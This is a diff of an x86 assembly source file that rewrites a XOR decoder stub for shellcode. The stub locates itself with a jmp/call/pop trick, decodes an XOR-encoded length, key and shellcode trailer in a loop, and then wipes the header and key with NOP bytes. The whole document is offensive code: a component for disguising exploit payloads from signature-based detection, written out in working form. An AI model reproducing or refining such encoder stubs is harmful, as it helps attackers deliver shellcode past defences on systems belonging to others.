@@ -1,65 +1,76 @@
 BITS 32
 
 ; plain x86 | trailer
-; ---------------------------------------------------------------------------------------------
-; | decoder | 2 byte shellcode len | 1 byte xor key len | xor key (xor key len) | shellcode   |
-; ----------------[XOR ENCODED]--------------------------------------------------[XOR ENCODED]-
-;           | Reg: cx              | Reg: dl            | [esi]+3+dh            | [esi]+3+dl+ebx
+; -----------------------------------------------------------------------------------------------------------
+; | decoder | 2 byte shellcode len | 1 byte xor key len | xor key (xor key len) | shellcode (shellcode len) |
+; ----------------[XOR ENCODED]---------------------------------------------------------[XOR ENCODED]--------
+;           | Reg: cx              | Reg: dl            | [esi]+3+dh            | [esi]+3+dl+(cx-i)
 
 
-jmp		short go
-next:
+jmp short	get_eip
+got_eip:
 pop		esi		; get stackpointer := start+sizeof(decoder)
 
 xor		ecx,ecx
 mov word	cx,[esi]	; shellcode len (encoded)
 xor word	cx,0x0101	; decode shellcode len
+mov		edi,ecx		; save it in edi
 
 ; dh := xor pad
 ; dl := xor key len
 xor		edx,edx
 mov byte	dl,[esi+2]
 
-xor		ebx,ebx		; zero out
-change:
-; calc memory location
-mov 		eax,esi
-push dword	eax
-add dword	[esp],0x3	; shellcode len (2 bytes) + xor key len (1 byte)
-movzx		eax,dl
-add		[esp],eax
-add 		[esp],ebx
-pop dword	eax		; eax holds the pointer to our next encoded byte
+decryptloop:
+; calculate key pos
+mov		eax,esi		; move trailer ptr to eax
+add		eax,edi		; add shellcode len to esi [ptr]
+add		eax,0x3		; 0x3 := shellcode len + xor key len
+xor		ebx,ebx
+movzx		ebx,dl		; ebx := xor key len
+add		eax,ebx		; eax := eax + xor key len
+sub		eax,ecx		; eax := eax - i
+push		eax
 
-mov		edi,eax
+; calculate shellcode pos
+mov		eax,esi		; same as above
+add		eax,0x3		; same as above
+xor		ebx,ebx
+movzx		ebx,dh		; ebx := xor key offset
+add		eax,ebx		; eax := eax + xor key offset
+push		eax
 
-mov		eax,esi		; <----- DBG
-push dword	eax
-add dword	[esp],0x3	; see above
-movzx		eax,dh
-add		[esp],eax
-pop dword	eax		; al holds the xor 1-byte-pad
-; TODO: not rly efficient, change it!
-push dword	esi		; save our trailer pointer
-mov		esi,[eax]
-xor		eax,eax
-;mov byte	al,esi
-pop dword	esi		; get our trailer pointer
+; do the real stuff ;)
+pop		eax		; ptr to next xor'ing byte in eax
+mov		bl, [eax]	; b-low is our xor'ing byte (key-pad)
+pop		eax
+mov		bh, [eax]	; b-high is an encrypted shellcode byte
+xor byte	bh,bl		; b-low XOR b-high
+mov		[eax],bh	; copy our decrypted byte back into memory
 
-xor byte	[edi],al
+; re-calculate xor pad
+inc		dh		; xor key offset++
+;inc		dh		; again (for comparing dh with dl)
+cmp		dh,dl
+jne		nexti
+xor		dh,dh
 
-inc		ebx
-cmp		ebx,ecx
-je		done		; no more bytes left
+; prepare next iteration
+nexti:
+;dec		dh
+dec		ecx
+jnz		decryptloop
 
-inc		dh		; next xor 1-byte-pad
-cmp		dh,dl		; check if xor pad == xor len
-jne		change		
-xor byte	dh,dh
-jmp		change
+; cleanup header + xorkey (overwrite with NOPsled)
+mov byte	[esi],0x90
+mov byte	[esi+1],0x90
+mov		cl,[esi+2]
+mov byte	[esi+2],0x90
+nop_xorkey:
+mov byte	[esi+2+ecx],0x90
+loop nop_xorkey
 
+jmp short	done
+get_eip:
+call got_eip
 done:
-jmp		short ok
-go:
-call		next
-ok:
